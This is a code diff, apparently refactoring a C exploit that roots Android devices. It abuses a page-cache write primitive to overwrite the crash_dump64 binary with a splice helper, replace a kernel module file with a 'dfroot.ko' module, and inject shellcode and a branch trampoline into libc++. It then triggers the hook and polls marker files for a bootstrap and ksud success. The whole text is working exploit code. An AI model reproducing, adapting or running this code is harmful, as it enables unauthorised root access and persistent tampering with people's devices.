@@ -50,38 +50,42 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
         iv[i] = dec[i] ^ desired[i];
 }
 
+/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
+ * Pass mode="r" for read, NULL for write-splice.
+ * Returns waitpid status, or -1 if clone fails (already logged).
+ */
+static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
+{
+    char offstr[24];
+    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
+    if (pid == 0) {
+        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
+        if (mode)
+            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
+        else
+            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
+        _exit(1);
+    }
+    int st = 0;
+    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+    return st;
+}
+
 /* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
- * crash_dump64 has been overwritten with splicehelper which supports argv[3]="r".
  */
 static int read_vendor_content(off_t offset, uint8_t buf[16]) {
     int rdpipe[2];
     if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
 
-    char offstr[24];
-    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
-
-    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
-    if (pid < 0) {
-        printf("vfork failed: %s\n", strerror(errno));
-        close(rdpipe[0]); close(rdpipe[1]);
-        return -1;
-    }
-    if (pid == 0) {
-        close(rdpipe[0]);
-        if (rdpipe[1] != 0) {
-            if (dup2(rdpipe[1], 0) < 0) _exit(1);
-            close(rdpipe[1]);
-        }
-        execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, "r", NULL);
-        _exit(1);
-    }
+    int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
     close(rdpipe[1]);
-    int status;
-    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
     int n = 0;
-    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
+    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
         n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
     close(rdpipe[0]);
+    if (status < 0) return -1;
     if (n != 16) {
         if (WIFEXITED(status)) {
             static const char *const exit_meanings[] = {
@@ -124,17 +128,8 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
     }
 
     if (use_helper) {
-        char offstr[24];
-        snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
-        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
-        if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
-        if (pid == 0) {
-            if (pipe_wr != 1 && dup2(pipe_wr, 1) < 0) _exit(1);
-            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
-            _exit(1);
-        }
-        int st;
-        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+        int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
+        if (st < 0) return -1;
         if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
             printf("splice helper failed status=0x%x\n", st);
             return -1;
@@ -166,25 +161,23 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
     int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
     if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
-    {
-        int opt = 1;
-        setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-        struct sockaddr_in src = {
-            .sin_family = AF_INET,
-            .sin_port   = htons((uint16_t)g_sender_port),
-            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
-        };
-        if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
-            printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
-        struct sockaddr_in dst = {
-            .sin_family = AF_INET,
-            .sin_port   = htons((uint16_t)g_encap_port),
-            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
-        };
-        if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
-            printf("connect failed: %s\n", strerror(errno));
-            close(sk_send); return -1;
-        }
+    int opt = 1;
+    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    struct sockaddr_in src = {
+        .sin_family = AF_INET,
+        .sin_port   = htons((uint16_t)g_sender_port),
+        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+    };
+    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
+        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
+    struct sockaddr_in dst = {
+        .sin_family = AF_INET,
+        .sin_port   = htons((uint16_t)g_encap_port),
+        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+    };
+    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
+        printf("connect failed: %s\n", strerror(errno));
+        close(sk_send); return -1;
     }
 
     int file_fd = -1;
@@ -230,8 +223,6 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
             printf("write #%zu at 0x%lx failed\n", i, (long)off);
             rc = -1; break;
         }
-        if (i % 32 == 0)
-            printf("%zu ...\n", i * 16);
     }
 
     close(pfd[0]); close(pfd[1]);
@@ -331,23 +322,21 @@ static int patch_helper(void) {
     size_t len;
     char *buf = pad16(splice_helper_start,
                       (size_t)(splice_helper_end - splice_helper_start), &len);
-    if (!buf) return -1;
-    printf("* patch_helper (crash_dump64 <- splicehelper, %zu bytes)\n", len);
+    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
+    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
     int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
-    if (ret) { free(buf); printf("patch_helper failed: %d\n", ret); return ret; }
+    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
 
-    {
-        uint8_t verify[16];
-        int vfd = open(kCrashDump, O_RDONLY);
-        if (vfd >= 0) {
-            ssize_t n = pread(vfd, verify, 16, 16);
-            close(vfd);
-            if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
-                printf("patch_helper verify FAILED: page cache not modified\n");
-                free(buf);
-                return -1;
-            }
-            printf("patch_helper verify OK\n");
+    uint8_t verify[16];
+    int vfd = open(kCrashDump, O_RDONLY);
+    if (vfd >= 0) {
+        ssize_t n = pread(vfd, verify, 16, 16);
+        close(vfd);
+        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
+            printf("patch: crash_dump64 verification failed\n");
+            printf("patch: DEVICE NOT VULNERABLE\n");
+            free(buf);
+            return -1;
         }
     }
     free(buf);
@@ -357,33 +346,32 @@ static int patch_helper(void) {
 static int patch_ko(void) {
     int andr = 0, major = 0, minor = 0;
     if (read_device_versions(&andr, &major, &minor) != 0) {
-        printf("Unable to match kernel version - possibly unsupported Non-GKI device\n"); return 1;
+        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
     }
     const struct KoImage *ko = select_ko_image(andr, major, minor);
     if (!ko) {
-        printf("unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
+        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
     }
-    printf("* ko android%d-%d.%d (%d bytes)\n",
-             ko->android_release, ko->kver_major, ko->kver_minor,
-             (int)(ko->end - ko->start));
+    printf("Using KMI: android%d-%d.%d\n",
+             ko->android_release, ko->kver_major, ko->kver_minor);
 
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
-    if (!buf) return -1;
-    printf("* patch_ko (%s <- dfroot.ko, %zu bytes)\n", libcxx_ko_target, len);
+    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
-    if (ret) printf("patch_ko failed: %d\n", ret);
+    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
     return ret;
 }
 
 static void cleanup(void) {
-    printf("=== cleanup ===\n");
     if (!g_libcxx_r.valid) return;
-    printf("* restore trampoline in %s\n", g_libcxx_r.lib);
+    printf("\n=== cleanup ===\n");
+    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
     patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
                    (size_t)g_libcxx_r.tramp_aligned, 0);
-    printf("* restore shellcode in %s\n", g_libcxx_r.lib);
+    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
     patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                    (size_t)g_libcxx_r.shell_off, 0);
 }
@@ -395,17 +383,18 @@ static int patch_hook(const char *lib, const char *sym,
                       char *stage_data, uint32_t stage_len, char *stage_start,
                       char *first_inst_copy, struct PatchRestore *restore) {
     uint64_t hook_off, shell_off; uint32_t first_insn;
+    printf("Finding symbol offsets for %s:\n", lib);
     if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn)) {
-        printf("find %s hook target failed\n", lib); return 1;
+        printf("failed to find offsets for %s\n", lib); return 1;
     }
-    printf("%s hook=0x%lx shell=0x%lx len=%u\n", lib, hook_off, shell_off, stage_len);
+    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
 
     const uint32_t BRANCH = 0x14000000;
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
     uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
 
     if (first_insn == hook_insn) {
-        printf("%s already hooked\n", lib); return 0;
+        printf("%s already patched\n", lib); return 0;
     }
     uint32_t jmpback = BRANCH |
         (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
@@ -413,7 +402,7 @@ static int patch_hook(const char *lib, const char *sym,
     *(uint32_t *)&first_inst_copy[0] = first_insn;
 
     size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
-    if (!buf) return -1;
+    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }
 
     if (padded > sizeof(restore->shell_orig)) {
         printf("shellcode too large to save (%zu)\n", padded);
@@ -434,25 +423,25 @@ static int patch_hook(const char *lib, const char *sym,
     restore->tramp_aligned = aligned;
     restore->valid         = 1;
 
-    printf("* patching %s shellcode\n", lib);
+    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
     int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
     free(buf);
-    if (ret) { printf("* patching %s shellcode failed\n", lib); return ret; }
+    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
 
     int pos = (int)(hook_off & 15);
     uint8_t blk[16];
     memcpy(blk, restore->tramp_orig, 16);
-    blk[pos+0] = (uint8_t)(hook_insn      );
-    blk[pos+1] = (uint8_t)(hook_insn >>  8);
-    blk[pos+2] = (uint8_t)(hook_insn >> 16);
-    blk[pos+3] = (uint8_t)(hook_insn >> 24);
-    printf("* patching %s trampoline at 0x%lx\n", lib, hook_off);
-    return patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
+    memcpy(&blk[pos], &hook_insn, 4);
+    printf("patch: %s <- trampoline (16 bytes)\n", lib);
+    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
+    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
+    return ret2;
 }
 
 static int createOrphanProcess(void) {
+    printf("Triggering hook...\n");
     int pid = fork();
-    if (pid < 0) { printf("fork failed: %s\n", strerror(errno)); return -1; }
+    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
     if (pid == 0) {
         int pid2 = fork();
         if (pid2 == 0) { sleep(1); _exit(0); }
@@ -461,8 +450,6 @@ static int createOrphanProcess(void) {
     TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
     return 0;
 }
-
-static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
 static const char *detect_ko_target(void) {
     static const char *const candidates[] = {
@@ -529,12 +516,11 @@ static int setup(int argc, char **argv) {
     printf("found ko_target: %s\n", ko_target);
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
-    printf("\n");
     return 0;
 }
 
 static int exploit(void) {
-    printf("=== exploit ===\n");
+    printf("\n=== exploit (patching files) ===\n");
 
     int rc = 3;
     if (patch_helper()) goto done;
@@ -546,41 +532,44 @@ static int exploit(void) {
 
     rc = 2;
     usleep(500000);
-    printf("* triggering...\n");
+    
+    printf("\n=== init  ===\n");
     createOrphanProcess();
 
-    {
-        static const struct {
-            const char *path;
-            const char *msg;
-            int         rc;
-        } markers[] = {
-            { "/dev/df",   "libc++: mutex acquired, loading custom module", -1 },
-            { "/dev/dfm0", "dfroot: launching bootstrap",                   -1 },
-            { "/dev/dfm1", "bootstrap: prefs loaded",                       -1 },
-            { "/dev/dfm2", "bootstrap: env adopted",                        -1 },
-            { "/dev/dfm3", "bootstrap: partitions set ro",                  -1 },
-            { "/dev/dfm4", "***SUCCESS***",                                   0 },
-            { "/dev/dfm5", "***FAILED***: ksud exited with error",            1 },
-            { "/dev/dfm6", "***FAILED***: bootstrap could not read prefs",    1 },
-        };
-        int seen[sizeof(markers)/sizeof(markers[0])] = {0};
+    static const struct {
+        const char *path;
+        const char *msg;
+        int         rc;
+    } markers[] = {
+        { "/dev/df",    "libc++: mutex acquired, loading custom module",  -1 },
+        { "/dev/dfm0",  "dfroot: launching bootstrap",                   -1 },
+        { "/dev/dfme0", "***FAILED***: bootstrap could not read prefs",   1 },
+        { "/dev/dfm1",  "bootstrap: prefs loaded",                       -1 },
+        { "/dev/dfm7",  "bootstrap: adopting zygote env",                -1 },
+        { "/dev/dfmw0", "bootstrap: WARNING: adopt zygote env failed",   -1 },
+        { "/dev/dfm2",  "bootstrap: env adopted",                        -1 },
+        { "/dev/dfm8",  "bootstrap: setting partitions ro",              -1 },
+        { "/dev/dfmw1", "bootstrap: WARNING: set partitions ro failed",  -1 },
+        { "/dev/dfm3",  "bootstrap: partitions set ro",                  -1 },
+        { "/dev/dfmw2", "bootstrap: WARNING: disable modules failed",    -1 },
+        { "/dev/dfm4",  "***SUCCESS***",                                   0 },
+        { "/dev/dfme1", "***FAILED***: ksud exited with error",           1 },
+    };
+    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
-        for (int elapsed = 0; elapsed < 7000; elapsed += 10) {
-            usleep(10000);
-            for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
-                if (!seen[j] && has_marker(markers[j].path)) {
-                    seen[j] = 1;
-                    printf("%s\n", markers[j].msg);
-                    if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
-                }
+    for (int elapsed = 0; elapsed < 7000; elapsed += 10) {
+        usleep(10000);
+        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
+            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
+                seen[j] = 1;
+                printf("%s\n", markers[j].msg);
+                if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
             }
         }
     }
     printf("***FAILED***: check logs\n");
 done:
     if (rc == 3) printf("***FAILED***: failed to patch files\n");
-    printf("\n");
     return rc;
 }
 
